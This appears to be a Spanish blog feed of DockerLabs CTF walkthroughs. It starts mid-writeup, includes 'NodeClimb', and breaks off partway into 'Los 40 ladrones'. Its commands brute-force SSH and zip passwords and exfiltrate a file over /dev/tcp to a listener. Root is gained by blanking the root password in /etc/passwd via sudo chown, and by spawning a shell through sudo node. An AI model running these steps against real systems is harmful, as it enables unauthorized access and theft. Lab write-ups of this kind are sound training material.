<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>passsamba@64a2dd61671c:~<span class="nv">$ </span><span class="nb">cat </span>note.txt 

What would <span class="s2">"sambaarribasiempre"</span> be used <span class="k">for</span>?
</code></pre></div></div>

<p>Veamos para que sirve… usando <strong>patator</strong> de nuevo:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>patator ssh_login <span class="nv">host</span><span class="o">=</span>172.18.0.2 <span class="nv">user</span><span class="o">=</span>FILE0 <span class="nv">password</span><span class="o">=</span>sambaarribasiempre <span class="nv">0</span><span class="o">=</span>users.txt
23:40:33 patator    INFO - code  size    <span class="nb">time</span> | candidate                          |   num | mesg
23:40:33 patator    INFO - <span class="nt">-----------------------------------------------------------------------------</span>
23:40:33 patator    INFO - 0     40     0.086 | sambauser                          |     2 | SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5
23:40:36 patator    INFO - 1     22     2.671 | passsamba                          |     3 | Authentication failed.
23:40:36 patator    INFO - 1     22     2.920 | root-false                         |     1 | Authentication failed.
</code></pre></div></div>

<p>Son las credenciales de <strong>sambauser</strong>.</p>

<h1 id="movimientos-laterales">Movimientos laterales</h1>

<p>Nos cambiamos al user <strong>sambauser</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>passsamba@64a2dd61671c:~<span class="nv">$ </span>su sambauser
Password: 
sambauser@64a2dd61671c:/home/passsamba<span class="nv">$ </span><span class="nb">cd
</span>sambauser@64a2dd61671c:~<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>sambauser<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>sambauser<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>sambauser<span class="o">)</span>,100<span class="o">(</span><span class="nb">users</span><span class="o">)</span>
sambauser@64a2dd61671c:~<span class="err">$</span>
</code></pre></div></div>

<p>Buscamos donde está ubicado el recurso compartido en el sistema:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sambauser@64a2dd61671c:/<span class="nv">$ </span>find / <span class="nt">-name</span> read_only_share 2&gt;/dev/null
/srv/samba/read_only_share
</code></pre></div></div>

<p>Encontramos un fichero <strong>secret.txt</strong>. Nos lo pasamos a nuestra máquina, para ello nos ponemos a la escucha con <strong>nc</strong> redirigiendo la salida al fichero secret.txt y nos lo mandamos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8888 <span class="o">&gt;</span> secret.zip
listening on <span class="o">[</span>any] 8888 ...

sambauser@64a2dd61671c:~<span class="nv">$ </span><span class="nb">cat</span> /srv/samba/read_only_share/secret.zip <span class="o">&gt;</span> /dev/tcp/172.18.0.1/8888
</code></pre></div></div>

<p>Con <strong>patator</strong> y el módulo <strong>unzip_pass</strong> obtenemos la contraseña del fichero zip:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>patator unzip_pass <span class="nv">zipfile</span><span class="o">=</span>secret.zip <span class="nv">password</span><span class="o">=</span>FILE0 <span class="nv">0</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="nt">-x</span> ignore:code!<span class="o">=</span>0
23:50:13 patator    INFO - code  size    <span class="nb">time</span> | candidate                          |   num | mesg
23:50:13 patator    INFO - <span class="nt">-----------------------------------------------------------------------------</span>
23:50:16 patator    INFO - 0     82     0.006 | qwert
</code></pre></div></div>

<p>Lo descomprimimos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>7z x secret.zip

<span class="nv">$ </span><span class="nb">cat </span>secret.txt
root-false:cGFzc3dvcmRiYWRzZWN1cmV1bHRyYQ<span class="o">==</span>
</code></pre></div></div>

<p>Y desciframos la clave:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'cGFzc3dvcmRiYWRzZWN1cmV1bHRyYQ=='</span> | <span class="nb">base64</span> <span class="nt">-d</span>
passwordbadsecureultra
</code></pre></div></div>

<p>Nos movemos a <strong>root-false</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sambauser@64a2dd61671c:~<span class="nv">$ </span>su root-false
Password: 
root-false@64a2dd61671c:/home/sambauser<span class="nv">$ </span><span class="nb">whoami
</span>root-false
</code></pre></div></div>

<p>Leemos el mensaje:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root-false@64a2dd61671c:~<span class="nv">$ </span><span class="nb">cat </span>message.txt 

Mario, remember this word, <span class="k">then </span>the boss will get angry:

<span class="s2">"pinguinodemarioelmejor"</span>
</code></pre></div></div>

<p>Buscando por el sistema encontramos que hay una segunda web:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root-false@64a2dd61671c:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /etc/apache2/sites-available/
total 16
<span class="nt">-rw-r--r--</span> 1 root root 1286 Mar 18 13:35 000-default.conf
<span class="nt">-rw-r--r--</span> 1 root root 4573 Mar 18 13:35 default-ssl.conf
<span class="nt">-rw-r--r--</span> 1 root root  386 Aug 27 11:03 second-site.conf
</code></pre></div></div>

<p>Vemos que contiene:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root-false@64a2dd61671c:~<span class="nv">$ </span><span class="nb">cat</span> /etc/apache2/sites-available/second-site.conf 
&lt;VirtualHost 10.10.11.5:80&gt;
    ServerName 10.10.11.5
    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/second-site

    &lt;Directory /var/www/second-site&gt;
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted
    &lt;/Directory&gt;

    ErrorLog <span class="k">${</span><span class="nv">APACHE_LOG_DIR</span><span class="k">}</span>/error.log
    CustomLog <span class="k">${</span><span class="nv">APACHE_LOG_DIR</span><span class="k">}</span>/access.log combined
&lt;/VirtualHost&gt;
</code></pre></div></div>

<p>Vemos que la web hay un formulario para hacer login. Tras probar con los usuarios que conocemos y no obtener acceso probamos con el user mario y obtenemos acceso. Como vemos, usando -vvv en curl, vemos que la respuesta ha sido <code class="language-plaintext highlighter-rouge">HTTP/1.1 302 Found</code> y nos redirige a <code class="language-plaintext highlighter-rouge">Location: super_secure_page/admin.php</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root-false@64a2dd61671c:~<span class="nv">$ </span>curl <span class="nt">-vvv</span> <span class="nt">-H</span> <span class="s2">"Content-Type: application/x-www-form-urlencoded"</span>  <span class="nt">-d</span> <span class="s1">'username=mario&amp;password=pinguinodemarioelmejor'</span> http://10.10.11.5/
<span class="k">*</span>   Trying 10.10.11.5:80...
<span class="k">*</span> Connected to 10.10.11.5 <span class="o">(</span>10.10.11.5<span class="o">)</span> port 80
<span class="o">&gt;</span> POST / HTTP/1.1
<span class="o">&gt;</span> Host: 10.10.11.5
<span class="o">&gt;</span> User-Agent: curl/8.5.0
<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
<span class="o">&gt;</span> Content-Type: application/x-www-form-urlencoded
<span class="o">&gt;</span> Content-Length: 46
<span class="o">&gt;</span> 
&lt; HTTP/1.1 302 Found
&lt; Date: Mon, 02 Sep 2024 22:24:41 GMT
&lt; Server: Apache/2.4.58 <span class="o">(</span>Ubuntu<span class="o">)</span>
&lt; Location: super_secure_page/admin.php
&lt; Content-Length: 0
&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
&lt; 
<span class="k">*</span> Connection <span class="c">#0 to host 10.10.11.5 left intact</span>
</code></pre></div></div>

<p>Accedemos a la nueva ruta y en el código fuente encontramos el siguiente comentario:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root-false@64a2dd61671c:~<span class="nv">$ </span>curl http://10.10.11.5/super_secure_page/admin.php

&lt;<span class="o">!</span><span class="nt">--ultramegatextosecret</span>.txt--&gt;
</code></pre></div></div>

<p>Accedemos al fichero:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root-false@64a2dd61671c:~<span class="nv">$ </span>curl http://10.10.11.5/ultramegatextosecret.txt

En el reino de los hongos, se encontraba un lugar mágico y poco conocido: el Bosque de Nieve Eterna. Este bosque estaba cubierto de un manto blanco y brillante todo el año, y albergaba muchas criaturas fantásticas y secretos ocultos. Entre ellos, había una leyenda que hablaba de un pingüino muy especial que guardaba un gran secreto.

El pingüino en cuestión no era un pingüino común. Se llamaba Pinguino y era el guardián de un antiguo artefacto mágico conocido como el Cristal de la Aurora. Según la leyenda, el Cristal tenía el poder de controlar el clima y podía traer tanto la eterna primavera como un invierno sin fin, dependiendo de la voluntad de su portador.

Una tarde, mientras Mario exploraba el Bosque de Nieve Eterna, llegó a un claro donde vio a Pinguino deslizarse alegremente por una pista de hielo. Mario, siempre curioso, se acercó al pingüino y le preguntó sobre el cristal.

Pinguino, con una mirada sabia en sus ojos, le dijo a Mario que el Cristal de la Aurora estaba escondido en una cueva secreta bajo el lago helado del bosque. Sin embargo, solo el corazón puro y valiente de un verdadero héroe podría encontrarlo. La entrada a la cueva estaba oculta por una mágica capa de hielo que solo se derretía cuando alguien con buenas intenciones realizaba un acto de bondad.

Mario decidió aceptar el desafío. Durante su travesía, ayudó a los habitantes del bosque: rescató a un grupo de conejos atrapados en una tormenta de nieve, reparó una antigua fuente que había sido dañada por un deshielo imprevisto y, sobre todo, demostró su valentía enfrentando a una banda de Koopa Troopas que habían estado causando estragos en la región.

Al realizar estos actos de bondad, el hielo sobre el lago comenzó a derretirse, revelando una entrada oculta en la cueva. Mario entró con cuidado y, con la guía de Pinguino, encontró el Cristal de la Aurora brillando en su pedestal.

El pingüino le explicó que el cristal no solo tenía el poder de controlar el clima, sino que también representaba el equilibrio y la armonía entre las estaciones. Mario comprendió que era esencial mantener ese equilibrio para el bienestar de todo el reino.

Con el Cristal_de_la_Aurora a salvo, Mario y Pinguino regresaron al claro del bosque. El pingüino le agradeció a Mario por su valentía y bondad, y le dijo que siempre podría contar con el bosque para cualquier futuro desafío.

Desde ese día, Mario visitó el Bosque de Nieve Eterna cada vez que necesitaba un consejo sabio, y la leyenda del pingüino guardián del cristal se convirtió en una historia popular en el Reino de los Hongos, recordando a todos que la bondad y la valentía siempre encuentran su recompensa.

by less

</code></pre></div></div>

<p>Lo único que llama la atención es <strong>Cristal_de_la_Aurora.</strong> Probamos a usarlo para movernos a <strong>less:</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root-false@64a2dd61671c:~<span class="nv">$ </span>su less
Password: 
less@64a2dd61671c:/home/root-false<span class="err">$</span>
</code></pre></div></div>

<p>Vemos que puede ejecutar como <strong>root</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>less@64a2dd61671c:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>less on 64a2dd61671c:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin,
    use_pty

User less may run the following commands on 64a2dd61671c:
    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /bin/chown
</code></pre></div></div>

<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>

<p>Vamos a cambiar los permisos al fichero <code class="language-plaintext highlighter-rouge">/etc/passwd</code> para que sea propiedad de <strong>less</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>less@64a2dd61671c:~<span class="nv">$ </span><span class="nb">sudo chown </span>less:less /etc/passwd
</code></pre></div></div>

<p>Después editamos el fichero. Borramos la <strong>x</strong> que esta entre root y 0.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>less@64a2dd61671c:~<span class="nv">$ </span>nano /etc/passwd
<span class="c"># Antes</span>
root:x:0:0:root:/root:/bin/bash

<span class="c"># Después</span>
root::0:0:root:/root:/bin/bash
</code></pre></div></div>

<p>Y con ese cambio nos podemos logear como root sin contraseña.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>less@64a2dd61671c:~<span class="nv">$ </span>su
root@64a2dd61671c:/home/less# <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
root@64a2dd61671c:/home/less#
</code></pre></div></div>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="dockerlabs" /><category term="ctf" /><category term="linux" /><category term="dificil" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">NodeClimb</title><link href="/posts/nodeclimb/" rel="alternate" type="text/html" title="NodeClimb" /><published>2024-07-05T00:00:00+00:00</published><updated>2024-07-05T00:00:00+00:00</updated><id>/posts/nodeclimb</id><content type="html" xml:base="/posts/nodeclimb/"><![CDATA[<p><img src="/assets/images/node/node.png" alt="image" /></p>

<p>Estamos ante un docker que contiene una distribución Linux. Es de nivel fácil y es de la plataforma <a href="https://dockerlabs.es/">dockerlabs</a>.</p>

<h1 id="enumeración">Enumeración</h1>

<p>Ponemos el docker en marcha con el <code class="language-plaintext highlighter-rouge">auto_deploy.sh</code> que trae el zip. Cuando termina de cargar nos indica la dirección IP de nuestra víctima, en nuestro caso es <code class="language-plaintext highlighter-rouge">172.17.0.2</code>.</p>

<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">172.17.0.2</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 172.17.0.2
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
</code></pre></div></div>

<p>Vemos que solo tiene los puertos <strong>21</strong> y <strong>22</strong>  abiertos. Vamos a realizar otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code> pero esta vez para detectar la versión del servicio que este corriendo, <code class="language-plaintext highlighter-rouge">-sV</code>, y para ejecutar los scripts por defecto para detectar vulnerabilidades, <code class="language-plaintext highlighter-rouge">-sC</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p21</span>,22 172.17.0.2
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
|_-rw-r--r--    1 0        0             242 Jul 05 09:34 secretitopicaron.zip
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged <span class="k">in </span>as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   256 <span class="nb">cd</span>:1f:3b:2d:c4:0b:99:03:e6:a3:5c:26:f5:4b:47:ae <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 a0:d4:92:f6:9b:db:12:2b:77:b6:b1:58:e0:70:56:f0 <span class="o">(</span>ED25519<span class="o">)</span>
</code></pre></div></div>

<h1 id="intrusión">Intrusión</h1>

<p>Vemos que nos podemos conectar al servidor <strong>ftp</strong> como usuario <em>anónimo</em> y que además hay un fichero a nuestro alcance. Entramos como <strong>ftp</strong> y nos lo descargamos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ftp ftp@172.17.0.2
Connected to 172.17.0.2.
220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
331 Please specify the password.
Password: 
230 Login successful.
Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.
ftp&gt; <span class="nb">ls
</span>229 Entering Extended Passive Mode <span class="o">(||</span>|8580|<span class="o">)</span>
150 Here comes the directory listing.
<span class="nt">-rw-r--r--</span>    1 0        0             242 Jul 05 09:34 secretitopicaron.zip
226 Directory send OK.
ftp&gt; get secretitopicaron.zip
<span class="nb">local</span>: secretitopicaron.zip remote: secretitopicaron.zip
229 Entering Extended Passive Mode <span class="o">(||</span>|49269|<span class="o">)</span>
150 Opening BINARY mode data connection <span class="k">for </span>secretitopicaron.zip <span class="o">(</span>242 bytes<span class="o">)</span><span class="nb">.</span>
100% |<span class="k">******************</span>|   242        1.77 MiB/s    00:00 ETA
226 Transfer complete.
242 bytes received <span class="k">in </span>00:00 <span class="o">(</span>183.76 KiB/s<span class="o">)</span>
ftp&gt; bye
221 Goodbye.
</code></pre></div></div>

<p>Intentamos descomprimirlo pero vemos que tiene una contraseña. Creamos el hash del fichero zip con <strong>zip2john</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>zip2john secretitopicaron.zip <span class="o">&gt;</span> zip.hash
ver 1.0 efh 5455 efh 7875 secretitopicaron.zip/password.txt PKZIP Encr: 2b chk, TS_chk, <span class="nv">cmplen</span><span class="o">=</span>52, <span class="nv">decmplen</span><span class="o">=</span>40, <span class="nv">crc</span><span class="o">=</span>59D5D024 <span class="nv">ts</span><span class="o">=</span>4C03 <span class="nv">cs</span><span class="o">=</span>4c03 <span class="nb">type</span><span class="o">=</span>0
</code></pre></div></div>

<p>Y después intentamos sacar la password del fichero zip:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt zip.hash 
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="o">[</span>32/64]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
password1        <span class="o">(</span>secretitopicaron.zip/password.txt<span class="o">)</span>     
1g 0:00:00:00 DONE <span class="o">(</span>2024-07-05 23:00<span class="o">)</span> 25.00g/s 102400p/s 102400c/s 102400C/s 123456..oooooo
</code></pre></div></div>

<p>En un segundo tenemos la clave, descomprimimos el fichero y la vemos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>password.txt 
mario:laKontraseñAmasmalotaHdelbarrioH
</code></pre></div></div>

<p>Nos conectamos al servidor <strong>ssh</strong> como <em>mario</em>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh mario@172.17.0.2
mario@172.17.0.2<span class="s1">'s password: 
Linux 014bc8cff695 6.8.11-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.8.11-1kali2 (2024-05-30) x86_64
</span></code></pre></div></div>

<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>

<p>Vemos que puede ejecutar como <strong>root</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mario@014bc8cff695:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>mario on 014bc8cff695:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin,
    use_pty

User mario may run the following commands on 014bc8cff695:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/node /home/mario/script.js
</code></pre></div></div>

<p>Puede ejecutar un script en node que esta vacio en el home de mario. Miramos a ver si hay algo en el historial de bash:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mario@014bc8cff695:~<span class="nv">$ </span><span class="nb">cat</span> .bash_history 
<span class="nb">sudo</span> <span class="nt">-l</span>
<span class="nb">sudo</span> /usr/local/bin/node <span class="nt">-e</span> <span class="s1">'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'</span> 
/usr/local/bin/node
locate node
apt <span class="nb">install </span>locate
<span class="nb">exit
sudo</span> <span class="nt">-l</span>
/usr/bin/node
<span class="nb">sudo</span> /usr/bin/node <span class="nt">-e</span> <span class="s1">'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'</span>
<span class="nb">exit
sudo</span> <span class="nt">-l</span>
<span class="nb">ls
exit
ls
whoami
sudo</span> <span class="nt">-l</span>
<span class="nb">cat </span>script.js 
<span class="nb">ls</span> <span class="nt">-l</span>
<span class="nb">exit</span>

</code></pre></div></div>

<p>Curiosamente nos da una pista de cómo obtener la shell desde node. Añadimos al fichero <strong>script.js</strong> la función para la creación de una shell:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mario@014bc8cff695:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'</span> <span class="o">&gt;</span> script.js
</code></pre></div></div>

<p>Y ejecutamos el comando con sudo:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/node /home/mario/script.js
<span class="c"># whoami;hostname;date</span>
root
014bc8cff695
Fri Jul  5 21:14:24 UTC 2024
<span class="c">#</span>
</code></pre></div></div>

<p>Con esto ya seriamos <strong>root</strong> en la máquina.</p>

<p>Un saludo</p>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="dockerlabs" /><category term="ctf" /><category term="linux" /><category term="facil" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Los 40 ladrones</title><link href="/posts/los40ladrones/" rel="alternate" type="text/html" title="Los 40 ladrones" /><published>2024-07-04T00:00:00+00:00</published><updated>2024-07-04T00:00:00+00:00</updated><id>/posts/los40ladrones</id><content type="html" xml:base="/posts/los40ladrones/"><![CDATA[<p><img src="/assets/images/los40/los40.jpg" alt="image" /></p>

<p>Estamos ante un docker que contiene una distribución Linux. Es de nivel fácil y es de la plataforma <a href="https://dockerlabs.es">dockerlabs</a>.</p>

<h1 id="enumeración">Enumeración</h1>

<p>Ponemos el docker en marcha con el <code class="language-plaintext highlighter-rouge">auto_deploy.sh</code> que trae el zip. Cuando termina de cargar nos indica la dirección IP de nuestra víctima, en nuestro caso es <code class="language-plaintext highlighter-rouge">172.17.0.2</code>.</p>

<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">172.17.0.2</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 172.17.0.2
PORT   STATE SERVICE
80/tcp open  http
</code></pre></div></div>

<p>Vemos que solo tiene el puerto <strong>80</strong> abierto. Vamos a realizar otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code> pero esta vez para detectar la versión del servicio que este corriendo, <code class="language-plaintext highlighter-rouge">-sV</code>, y para ejecutar los scripts por defecto para detectar vulnerabilidades, <code class="language-plaintext highlighter-rouge">-sC</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p80</span> <span class="nt">-v</span> 172.17.0.2
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.58 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
</code></pre></div></div>

<p>Vemos que la web es una página por defecto de la instalación de apache. Buscamos directorios y ficheros en el servidor con <strong>feroxbuster</strong>. Buscamos las extensiones <strong>php</strong>, <strong>html</strong> y <strong>txt</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>feroxbuster <span class="nt">-u</span> http://172.17.0.2 <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt <span class="nt">-r</span> <span class="nt">-d</span> 2 <span class="nt">-x</span> php,html,txt
200      GET      367l      977w    10792c http://172.17.0.2/index.html
200      GET       22l      105w     5952c http://172.17.0.2/icons/ubuntu-logo.png
200      GET      367l      977w    10792c http://172.17.0.2/200      GET        3l       20w      111c http://172.17.0.2/qdefense.txt
</code></pre></div></div>

<p>Encontramos un fichero llamado <strong>qdefense.txt</strong>. Lo descargamos y leemos su contenido:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://172.17.0.2/qdefense.txt
Recuerda llama antes de entrar , no seas como toctoc el maleducado
7000 8000 9000
busca y llama +54 2933574639
</code></pre></div></div>

<p>De el fichero obtenemos que hay un user llamado <strong>toctoc</strong> y una secuencia de números que puede ser una secuencia de <strong>Port Knocking.</strong>  El port knocking es un mecanismo para abrir puertos externamente en un firewall mediante una secuencia preestablecida de intentos de conexión a puertos que se encuentran cerrados. Una vez que el firewall recibe una secuencia de conexión correcta, sus reglas son modificadas para permitir al host que realizó los intentos conectarse a un puerto específico.</p>

<p>Para instalar en kali el comando knock realizamos lo siguiente: <code class="language-plaintext highlighter-rouge">sudo apt update &amp;&amp; sudo apt install -y knockd</code></p>

<p>Después golpeamos los puertos en la secuencia que hemos visto:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>knock <span class="nt">-v</span> 172.17.0.2 7000 8000 9000
hitting tcp 172.17.0.2:7000
hitting tcp 172.17.0.2:8000
hitting tcp 172.17.0.2:9000
</code></pre></div></div>

<p>Realizamos un nuevo escaneo de puertos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 172.17.0.2
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
</code></pre></div></div>

<p>Ahora ya tenemos el puerto <strong>22</strong> abierto. Como tenemos un user del sistema vamos a probar a buscar la contraseña de dicho usuario con <strong>hydra</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>hydra <span class="nt">-l</span> toctoc <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt <span class="nt">-t</span> 64 <span class="nt">-VIf</span> ssh://172.17.0.2
...
826 of 14344401 <span class="o">[</span>child 12] <span class="o">(</span>0/2<span class="o">)</span>
<span class="o">[</span>22][ssh] host: 172.17.0.2   login: toctoc   password: kittycat
<span class="o">[</span>STATUS] attack finished <span class="k">for </span>172.17.0.2 <span class="o">(</span>valid pair found<span class="o">)</span>
</code></pre></div></div>

<p>Nos conectamos con la password recién encontrada:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh toctoc@172.17.0.2                 
toctoc@172.17.0.2<span class="s1">'s password: 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.11-amd64 x86_64)
</span></code></pre></div></div>

<p>Vemos si el usuario toctoc puede ejecutar algún comando como <strong>root</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>toctoc@50a589993c7e:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>toctoc on 50a589993c7e:
    env_reset, mail_badpass,
